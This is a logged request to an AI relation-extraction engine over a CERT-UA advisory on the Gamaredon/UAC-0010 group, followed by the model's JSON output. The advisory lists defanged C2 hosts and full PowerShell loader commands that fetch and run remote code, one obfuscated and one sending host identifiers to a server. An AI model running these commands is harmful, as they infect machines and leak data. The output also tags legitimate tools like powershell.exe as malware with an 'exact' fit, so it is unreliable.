@@ -1,0 +1,274 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision relation extraction engine for cybersecurity incident reports (CERT-UA). The entities of one report have already been extracted and typed. Your only task is to state the relationships between these entities that the report supports.
+
+### ENTITIES OF THIS REPORT ###
+Each line is one entity: its name exactly as extracted, its type in square brackets, and a one-sentence description. The type "untyped" means no type has been established yet; the phrase after it is the extractor's own wording.
+- UAC-0010 [Threat Actor] A Russian state-sponsored cyber espionage threat group also known as Armageddon or Gamaredon.
+- Україна [Country] A country in Eastern Europe.
+- GammaLoad.PS1 [Malware Family] A PowerShell-based malware downloader used by the Gamaredon group to deliver subsequent payloads.
+- GammaSteel.PS1 [Malware Family] A PowerShell script used by Gamaredon to search for and exfiltrate specific files.
+- GammaSteel.NET [Malware Family] A .NET-based infostealer malware used by Gamaredon to steal credentials from web browsers.
+- HarvesterX [Malware Family] A legacy data-harvesting malware tool previously utilized by Gamaredon.
+- Normal.dotm [Malware Family] The default macro-enabled template file for Microsoft Word.
+- powershell.exe [Malware Family] The command-line shell and scripting tool executable for Microsoft Windows PowerShell.
+- wscript.exe [Malware Family] The Windows Script Host executable used to run VBScript and JScript files.
+- mshta.exe [Malware Family] A legitimate Windows utility used to execute Microsoft HTML Application (HTA) files.
+
+### KNOWN RELATION TYPES ###
+Each relation type is known ONLY for the pair of argument types it is listed under (head type -> tail type). Types known for other pairs are not shown and do not apply.
+Head [Threat Actor] -> Tail [Threat Actor]:
+- associated-with: The threat actor cluster is linked, attributed to, or affiliated with another threat actor group.
+
+Head [Threat Actor] -> Tail [Malware Family]:
+- uses-malware: The threat actor deploys, operates, or is attributed to using a specific malware family.
+
+Head [Malware Family] -> Tail [Malware Family]:
+- contains-file: An archive or container file encapsulates another specified file or malware component.
+- drops-and-executes: The source malware creates/drops a secondary malware file on the victim system and initiates its execution.
+
+### WHAT TO OUTPUT ###
+1. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two of the entities above, as { "head", "type", "tail", "evidence", "fit" }.
+   - `head` / `tail` MUST exactly match entity names from the list above. Direction: head acts on tail.
+   - `type`: if a known relation type listed under exactly this pair of argument types states the relationship precisely, use its name. Otherwise write a short lower-case verb phrase with hyphens in your own words, as specific as the text allows. Do NOT stretch a known type to a relationship it does not precisely state, and do NOT use a type listed under a different pair of argument types.
+   - `fit`: "exact" when a known type of this pair states the relationship precisely; "loose" when you used a known type of this pair although it only roughly fits; "new" when you wrote your own phrase.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+2. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY type you wrote yourself (fit "new").
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA відслідковується активність групи UAC-0010 (Armageddon).</p><p>Протягом першого півріччя 2022 року основним способом реалізації зловмисного задуму є розповсюдження засобами електронної пошти (зі скомпрометованих акаунтів і на приватні електронні адреси) HTM-дроперів (в тому числі, в UTF-16 кодуванні), що ініціюють ланцюг доставки GammaLoad.PS1 на комп'ютер жертви.</p><p>Метою зловмисників, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомогою макросу, код якого забезпечує генерацію URL-адреси та її додавання до створюваного документу у вигляді&nbsp;посилання (так званий "Remote template injection"). Зазначене призведе до інфікування всіх документів, які створюються на комп'ютері, та їх подальшого ненавмисного розповсюдження користувачем.</p><p>Як правило, для забезпечення персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">136bd98383e5b3e06b63f2d7c72a3d4d&nbsp; &nbsp; 81d8c20a19e1c2c3e5bfd6f8a39499321f42b07f6b94c9e0bb98fd6cfd4355a8&nbsp; &nbsp; Порядок денний на 04.08.2022.docx&nbsp;
+82e0e0838c6c8abf103d4e5dab78b703&nbsp; &nbsp; f2f6077597d1fdb84bbb35aebd169af522767bc3a6aae58e778c429626f376a3&nbsp; &nbsp; Порядок денний на 04.08.2022.docx
+1bba824db40a7ce52313ed76b55ac5fd&nbsp; &nbsp; f628fa53fc3f91c1d812246291b3a188904ab091c735e8dc7ed644103a0eb5c6&nbsp; &nbsp; faithfully.nab
+897c859e25576146f4e03329f076bd40&nbsp; &nbsp; 2cb17eb3450b4cfad148427986410cda69d47a124a7dea43c577a55569ff3761&nbsp; &nbsp; Normal.dotm
+9da690670ff22a610f632251538888c4&nbsp; &nbsp; 2dfef7c52c05c3b88818edd7764ef1f1d41c1450918441e6a5d8b1518b80ac3e&nbsp; &nbsp; Wikipedia Search Tools
+db5606f0010bb7fdc1e10174055b0f93&nbsp; &nbsp; 968f841df2fd5b7458d15569b756088691e6d4a04e5f6f22df1c773e1fe35129&nbsp; &nbsp; autowake
+a73326f0373131fdd4814b9fc67c7e34&nbsp; &nbsp; c82728665fafb66828f3fe2d9ee28b2e670e958abc1f5dda6c5e460db2502207&nbsp; &nbsp; MsCtfMonitor
+7d200a3eb82b9b3c60daa0866f9b6db9&nbsp; &nbsp; 6cccc179db19c405cc313f60d3bb09e00f7b273ec3c6ddf03ae4cba3fcac961d&nbsp; &nbsp; ScheduledDefrag
+904803767f7d3c8f2f947f40f8ba6272&nbsp; &nbsp; afcb200cf4a646397f67c37d396cd5573db2575ae945b3251dfb6d285d1e6724&nbsp; &nbsp; winsparcontrols
+9db94f4c9dba8adb2c13f1962c1fcaa6&nbsp; &nbsp; f1f4ed4122564c90b473617d9989a2a90af1d93c4b75c8cfecd564ff71f803a0&nbsp; &nbsp; regidlebackup
+7f0270c87e1d14d95c51cd303dbab195&nbsp; &nbsp; bcb63de0b16c449b054982ad1d4c23810a396e061ae45801df4d64acf4e82674&nbsp; &nbsp; КОРЗИНА.LNK
+6c6fbdd3dcf6919d6d2aff8065892b2c&nbsp; &nbsp; 1b59868b460359f46c6ae0a01b6f34c89a33b79992a03573fc40bd3c501cbea4&nbsp; &nbsp; НЕ СМОТРЕТЬ.LNk
+66d7796b61ddac70f748cbc1ff26dfef&nbsp; &nbsp; 00fe49d9fde36aace2e9c35962ac11f8595b8452d84ba02f4511754ced831d66&nbsp; &nbsp; ПОРНО.lNK
+949d29f97c11abeab41075bf2a6e9dfd&nbsp; &nbsp; 6f2004a5b3f4f1c84c0e0e08181cfb8bbc0f50617e58d57cecddf4789587880a&nbsp; &nbsp; НА ДОКЛАД.lNK
+94031409d9f552e174dcc66e2b3bd45b&nbsp; &nbsp; 564aba6e5366347b1e522b2af7a46fa54e6d23af4ce17b2dd3a5d45d925c7aa4&nbsp; &nbsp; МОИ ФОТО.LNk
+54cfc650263a61a5c372dd8b4fa6e9e5&nbsp; &nbsp; 788dc18de55d73027011a0b109b4b795e6ae485bdda7dd07deecab6af386170c&nbsp; &nbsp; РАЗОБРАТЬ.lnk
+b8686b1038a1f4c162c1f0454169fec8&nbsp; &nbsp; 7d2c607bb9627e14d572356ff653b587ea0d7f7b2c1f4ab45bb979b81f9369ae&nbsp; &nbsp; ФОТО.lnk
+a34a506a965669daf00075c5a22f7187&nbsp; &nbsp; 24fe5b916433ae295685dddcc5c808fb4cd3d3a2c3d999b721f4e650773b1ed4&nbsp; &nbsp; ХЛАМ.lNK
+f046e20e2429a47194cf7cb76db1dfd2&nbsp; &nbsp; c19dbecf59908f530a63705af62a3596531f7eecbb971a2926670fb4c0697a2c&nbsp; &nbsp; index.txt
+e45eeb97da3155179fb1c626ae930eda&nbsp; &nbsp; 79c340f1d8c78b96d4e92a78d9c407494769df79ab491dfe2b1955f26af4e388&nbsp; &nbsp; index.php
+7622a8f0bb0b97e17e186758f730af2d&nbsp; &nbsp; 143cc8dade3ac835c9114333e05544b52dc57a1273cbdd4aca38253a710c92ab&nbsp; &nbsp; joyful
+afa8f2b0ea413c568549360e8dfebe0a&nbsp; &nbsp; 6cb0ef2538cd074fbcccca5a96bb21538529220eeeeaca63e06a18cbbc6a9eb4&nbsp; &nbsp; judge (LNK-dropper)
+ea8c0a9bccd9fd91b78e06a2a58b559b&nbsp; &nbsp; 430206ba1fbd0c869b71608ad1808febfb067e086d0b330225b5afcddc1af352&nbsp; &nbsp; jump
+c5ab39da6f015a26edb916a0e37b9d57&nbsp; &nbsp; c172c8733c92d914574290eb46d8a6c1b49387d8d4dceafc3e13d953395c9710&nbsp; &nbsp; NTUSER.DAT.TMContainer.f4v
+b6840f52a5c655d22c70f14333238409&nbsp; &nbsp; 1928ea04a52ea5ced87305cc001e693385ecbb8d3b4c64c1288d4b223de841dd&nbsp; &nbsp; definite.bmp
+7e5ea867d5f4ed45dd26e304cef98678&nbsp; &nbsp; 452d40893e9973ec5e4779ea830320d80999b09a36113b7d86de866a02823a3c&nbsp; &nbsp; dependant.bmp
+859278e356de512859cd5bb94d09e9e4&nbsp; &nbsp; dcb69e1c9a6bff950481cf1f493b3e9665133e9afae528f0d38d72e83607a6d0&nbsp; &nbsp; dentist.bmp
+df887652a92d1103d5131aa68757b2cc&nbsp; &nbsp; 9b81fbe9f7157e7873862fe7fabd9df5fdb8197bf1cc01b5e34cbebf5ff0de13&nbsp; &nbsp; define.bmp
+83b3fd87ee87be5708326f99d4db3bbd&nbsp; &nbsp; f96489503934b654e00cbd0c48845d66aaf3b91f5bd53fd05d7ecfc48a66dc20&nbsp; &nbsp; defeat.bmp
+ffb49d24a6691bdb3f5f58a632ac4447&nbsp; &nbsp; 1113fc222132460fe481ed0a62fb3fe1426bc920cdb01d334c7a7a6ef952dfee&nbsp; &nbsp; decay.bmp
+396606ccd506b565d8590cae99be4950&nbsp; &nbsp; 7e3cfa63b31ed9e4606e43b29a704924a27b62d6b9a1360b462d9998deed549f&nbsp; &nbsp; declared.bmp
+3376d2b5e6f99d68824b93bad33e4884&nbsp; &nbsp; cb81b6516f13844c653a9fcbbbeed099dde5be307ec66523be7678d577dca477&nbsp; &nbsp; decrease.bmp
+9428c3fb7d4ae783a348561d5fa7b39e&nbsp; &nbsp; 88dc766c51f20c93b670bd67b543b70e8d627c9afc041ee74aa6b64c59eb1c7d&nbsp; &nbsp; defensive.bmp
+dc7266e0eed4a67e1bea6e044c114387&nbsp; &nbsp; a2361ca9fd84fd41d62628e2310317831f47f8e973c2bda24dadc0972fb983d6&nbsp; &nbsp; defined.icn
+a1b63c92db35c90e1058813919446c21&nbsp; &nbsp; 9c724d00f28b3453e283e5b0ef5c8455bb61d4c902c53cfb38f07ffb4e17e18d&nbsp; &nbsp; delicacy.bmp
+20531cf42e4f44a96c4aeb4cd7e2d70e&nbsp; &nbsp; a0c2429616e7bf8a36951d45cbc72a1eab4d4a1a1e8266753a75bdd683737814&nbsp; &nbsp; des.nds
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">138[.]197.199.151
+139[.]59.166.152
+144[.]202.61.174
+157[.]245.99.132
+159[.]203.11.73
+168[.]100.10.184
+178[.]62.108.75
+192[.]241.133.108
+194[.]180.174.73
+45[.]61.138.226
+45[.]61.139.22
+45[.]77.196.211
+45[.]77.237.252
+66[.]42.102.21
+70[.]34.218.135
+hXXp://138[.]197.199.151/get[.]php
+hXXp://139[.]59.166.152/get[.]php
+hXXp://144[.]202.61.174/get[.]php
+hXXp://157[.]245.99.132/get[.]php
+hXXp://159[.]203.11.73/get[.]php
+hXXp://178[.]62.108.75/get[.]php
+hXXp://192[.]241.133.108/get[.]php
+hXXp://194[.]180.174.73/1.txt
+hXXp://194[.]180.174.73/pswd[.]php
+hXXp://45[.]77.196.211/get[.]php
+hXXp://45[.]77.237.252/get[.]php
+hXXp://66[.]42.102.21/get[.]php
+hXXp://70[.]34.218.135/get[.]php
+hXXps://45[.]61.138.226
+hXXp://atlantar[.]ru/get.php
+hXXp://motoristo[.]ru/get.php
+hXXp://lover.printing82.detroito[.]ru/DESKTOP-P5BRFLE/luncheon.nab
+moolin[.]ru
+atlantar[.]ru
+bubenci[.]ru
+callsol[.]ru
+clipperso[.]ru
+cooperi[.]ru
+detroito[.]ru
+farafauler[.]ru
+fishitor[.]ru
+flayga[.]ru
+ganara[.]ru
+detroito[.]ru
+hawksi[.]ru
+hofsteder[.]ru
+kilitro[.]ru
+kurapat[.]ru
+leonardis[.]ru
+lnasfe[.]ru
+lopasts[.]ru
+mafirti[.]ru
+metanat[.]ru
+mitlubald[.]ru
+moolin[.]ru
+motoristo[.]ru
+paparat[.]ru
+pasamart[.]ru
+qkcew[.]ru
+rncsq[.]ru
+tarlit[.]ru
+tbwelo[.]ru
+wicksl[.]ru
+xcqef[.]ru
+
+(Telegram-акаунти, що використовуються для публікації IP-адреси серверу управління)
+hXXps://t[.]me/s/chanellsac
+hXXps://t[.]me/s/digitli
+hXXps://t[.]me/s/zalup2
+hXXps://t[.]me/s/zapula2
+hXXps://t[.]me/s/topnewsas
+hXXps://t[.]me/s/chabgei
+hXXps://t[.]me/s/toporsa
+
+(сервіси, що використовуються для DNS-резолву доменів)
+hXXps://dnslookup.seowebchecker[.]com/
+hXXps://ip-api[.]com/csv/
+hXXps://tools.nexcess[.]net/dns-check
+hXXps://viewdns[.]info/reverseip/?host=
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm
+C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Шаблони\Normal.dotm
+C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Шаблоны\Normal.dotm
+%USERPROFILE%\NTUSER.DAT.TM.defect.exe
+%USERPROFILE%\NTUSER.DAT.TM.defect.ini
+%USERPROFILE%\dedicate.exe
+%USERPROFILE%\dedicate.ini
+%USERPROFILE%\ntusers.ini
+%USERPROFILE%\Favorites\judge
+%USERPROFILE%\NTUSER.DAT.TMContainer.f4v
+%USERPROFILE%\decay.bmp
+%USERPROFILE%\des.nds
+%LOCALAPPDATA%\_profiles_new.ini
+%TMP%\micro.txt
+
+(Заплановані завдання)
+C:\Windows\System32\Tasks\creditcard.session
+C:\Windows\System32\Tasks\finance.create
+C:\Windows\System32\Tasks\finance.session
+C:\Windows\System32\Tasks\session.finance
+C:\Windows\System32\Tasks\ПОРНО.lNK
+C:\Windows\System32\Tasks\НА ДОКЛАД.lNK.lNK
+C:\Windows\System32\Tasks\ХЛАМ.lNK.lNK
+C:\Windows\System32\Tasks\РАЗОБРАТЬ.lnk.lNK
+C:\Windows\System32\Tasks\НЕ СМОТРЕТЬ.lNK
+C:\Windows\System32\Tasks\МОИ ФОТО.lNK
+C:\Windows\System32\Tasks\КОМПРОМАТ.LNK
+C:\Windows\System32\Tasks\КОРЗИНА.LNK
+C:\Windows\System32\Tasks\autowake
+C:\Windows\System32\Tasks\winsparcontrols
+C:\Windows\System32\Tasks\Wikipedia Search Tools
+C:\Windows\System32\Tasks\Preferences Style Configurator
+C:\Windows\System32\Tasks\MsCtfMonitor
+C:\Windows\System32\Tasks\regidlebackup
+C:\Windows\System32\Tasks\ScheduledDefrag
+HKCU\Environment\Include (змінна середовища)
+таємно.rtf.lnk (назва файлу)
+форма_нова.rtf.lnk (назва файлу)
+
+(команди)
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nologo iex (iex (get-content .\creditcard.session | out-string))
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $aaa = (New-Object system.Net.WebClient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa;
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::WriteAllText($($env:USERPROFILE+'\index.php') $tmp); iEx(IeX $tmp)
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};while ($IE1.ReadyState -ne 4) {Start-Sleep 2};$Doc = $IE1.document.GetType().InvokeMember('body'&nbsp; [System.Reflection.BindingFlags]::GetProperty&nbsp; $Null&nbsp; $IE1.document&nbsp; $Null).InnerHtml;$IE1.quit();[io.file]::WriteAllText($($env:USERPROFILE+'\index.txt') $Doc); iex(iex $Doc)
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.paparat.ru');$tmp = $(New-Object net.webclient).DownloadString('hXXp://'+$ip+'/lnk.php'); [io.file]::WriteAllText($($env:USERPROFILE+'\index.php') $tmp); iex(iex $tmp)
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hXXp://'+[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.lnasfe.ru')+'/lnk.php'); Set-Content -Path $env:USERPROFILE\index.php -Value $tmp; iex(iex $tmp)
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WiNDOwSTYle HIddEn -nOLoGO INvokE-exPRession (get-cOnTeNT $enV:usERPrOfilE\iNDeX.PHP | oUt-sTrInG) | PoWeRShELL -nOproFILE
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nol -nop echo (INVOKE-EXPRESSION(new-object net.webclient).downloadstring('hXXp://138.197.199.151/get.php')) | powershell -
+C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nol -nop echo ([system.text.encoding]::utf8.getstring((new-object net.webclient).UploadData('hXXp://159.203.11.73/get.php&nbsp; &nbsp;POST'&nbsp; 0)))|iex
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nologo Invoke-Expression $env:Include
+function Random(){ $rnd='d' +-join ((48..57) + (97..122) | Get-Random -Count $( Get-Random -Minimum 10 -Maximum 25) | % {[char]$_}); return $rnd; } function XorByte($key, $response) { [byte[]]$new_bytes = new-object byte[] $response.Length; for($i=0; $i -lt $response.count ; $i++){ $new_bytes[$i] = $response[$i] -bxor $key[$i % $key.Length]; } ; return $new_bytes; } function Get-IP() {$wc= New-Object net.webclient; $wc.Headers.Add(""Content-Type"",""application/x-www-form-urlencoded""); $response = $wc.UploadData(""hXXps://www.portcheckers.com/dns-lookup"", [System.Text.Encoding]::UTF8.GetBytes(""ipaddress=nxkad.ru"")); $ip = [System.Text.Encoding]::UTF8.GetString($response) |?{$_ -match ""\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}""}|%{$Matches[0]}; return $ip; }while($count -le 4){ try{ $ip=Get-IP; $url = ""hXXp://"" + $ip + ""/time.php""; $key = (Get-WmiObject Win32_LogicalDisk -Filter ""DeviceID='$env:SystemDrive'"" | Select-Object VolumeSerialNumber).VolumeSerialNumber; [string]$vsn = [System.Convert]::ToUInt32($key,16); $WebClient= New-Object net.webclient;$namevalueCln = New-Object System.Collections.Specialized.NameValueCollection; $rnd=Random; $namevalueCln.Add($rnd,$env:computername+"";""+$vsn); $response = $WebClient.UploadValues($url,$namevalueCln); [string]$myUri = [System.Text.Encoding]::UTF8.GetString($response); if($myUri.Length -gt 0){ if($myUri.substring(0,4) -eq ""hXXp"" ){ $respa1 = $WebClient.UploadValues($myUri,$namevalueCln); $new_bytes = XorByte $vsn $respa1; [string]$path = $env:TEMP + '\' + $(Get-Random)+ '.exe'; [io.file]::WriteAllBytes($path ,$new_bytes); Start-Sleep -s 20; if($path.Length -gt 0){ [System.Diagnostics.Process]::Start([string]$path); } }else{ Start-Sleep -s 5; $new_bytes = XorByte $key $response; $myUri = [System.Text.Encoding]::UTF8.GetString($new_bytes); start-job { $sc = New-Object -ComObject MSScriptControl.ScriptControl.1; $sc.Timeout = 999999; $sc.Language = 'VBScript'; $sc.AddCode($args[0])} -ArgumentList $myUri -runas32 | wait-job | receive-job; } } }catch{} Start-Sleep -s 250; }
+powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hXXp://motoristo.ru/get.php'))|powershell -)
+powershell -w hidden -nol -nop -c (iex ([string]::join(''&nbsp; ((101 99 104 111 32 40 105 101 120 32 40 110 101 119 45 111 98 106 101 99 116 32 110 101 116 46 119 101 98 99 108 105 101 110 116 41 46 100 111 119 110 108 111 97 100 115 116 114 105 110 103 40 39 104 116 116 112 58 47 47 109 111 116 111 114 105 115 116 111 46 114 117 47 103 101 116 46 112 104 112 39 41 41 124 112 111 119 101 114 115 104 101 108 108 32 45) |%{([char][int] $_)})))|iex)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p><br></p><p></p><p><br></p><p></p><p><br></p><p></p>
+
+=== RESPONSE (4.7s, in 9040 / out 599 tok, STOP) ===
+UAC-0010 (Armageddon) uses various malware families and tools including GammaLoad.PS1, GammaSteel.PS1, GammaSteel.NET, HarvesterX, powershell.exe, wscript.exe, and mshta.exe in its cyber operations.
+
+{
+  "relations": [
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "GammaLoad.PS1",
+      "evidence": "ініціюють ланцюг доставки GammaLoad.PS1 на комп'ютер жертви",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "GammaSteel.PS1",
+      "evidence": "для чого застосовується GammaSteel.PS1 та GammaSteel.NET",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "GammaSteel.NET",
+      "evidence": "для чого застосовується GammaSteel.PS1 та GammaSteel.NET",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "HarvesterX",
+      "evidence": "PowerShell-реалізацією раніше використовуваного HarvesterX",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "powershell.exe",
+      "evidence": "Активно використовується PowerShell (powershell.exe)",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "wscript.exe",
+      "evidence": "Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.",
+      "fit": "exact"
+    },
+    {
+      "head": "UAC-0010",
+      "type": "uses-malware",
+      "tail": "mshta.exe",
+      "evidence": "Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.",
+      "fit": "exact"
+    }
+  ],
+  "newRelationTypes": []
+}
